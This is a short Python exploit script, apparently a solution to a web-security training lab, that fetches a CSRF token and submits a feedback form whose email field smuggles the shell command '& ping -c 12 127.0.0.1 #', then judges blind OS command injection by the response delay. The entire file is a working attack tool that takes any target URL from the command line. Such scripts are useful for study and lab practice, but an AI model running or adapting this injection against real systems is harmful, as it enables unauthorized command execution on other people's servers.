import urllib.parse
import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def blind_os_command_injection(s, url):
    feedback_path = "/feedback/submit"
    payload = "test@test.com & ping -c 12 127.0.0.1 #&"
    csrf_url = "/feedback"
    csrf = get_csrf(s, url+csrf_url)
    myData = {
        'csrf':csrf,
        'name':'test',
        'email':payload,
        'subject':'test',
        'message':'test'
    }
    r = s.post(url+feedback_path, data=myData, verify=False, proxies=proxies)
    # print(r.elapsed.total_seconds)
    if int(r.elapsed.total_seconds()) > 9:
        return True
    else:
        return False


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s <url>" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("Injecting OS command...")
    s = requests.Session()
    if blind_os_command_injection(s,url):
        print("(+) OS command injection was successful")
    else:
        print("(-) OS command injection failed")

if __name__ == "__main__":
    main()